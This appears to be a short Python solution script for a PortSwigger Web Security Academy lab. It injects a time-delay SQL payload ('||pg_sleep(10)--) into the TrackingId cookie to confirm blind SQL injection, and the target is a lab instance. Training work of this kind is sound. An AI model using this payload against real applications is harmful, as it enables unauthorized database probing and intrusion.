#https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
from utils import *

url="https://0a0a00df044f41ea82de92dd0023001d.web-security-academy.net/filter?category=Gifts"
session=requests.Session()
response=session.get(url)
cookies=response.cookies
tracking_id=cookies['TrackingId']

forged_cookies=cookies
forged_cookies['TrackingId']=f"{tracking_id}'||pg_sleep(10)--"
response=session.get(url,cookies=forged_cookies)
print(check_succes(parse_html(response)))
#wait 10 secs 